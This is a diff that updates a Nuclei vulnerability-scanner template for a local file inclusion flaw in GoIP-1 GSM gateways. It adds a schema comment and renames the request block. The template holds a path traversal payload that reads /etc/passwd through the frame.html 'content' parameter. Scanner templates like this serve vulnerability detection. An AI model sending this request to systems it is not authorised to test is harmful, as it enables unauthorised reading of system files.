@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: goip-1-lfi
 
 info:
@@ -11,7 +12,7 @@ info:
     - http://en.dbltek.com/latestfirmwares.html
   tags: gsm,goip,lfi,iot
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
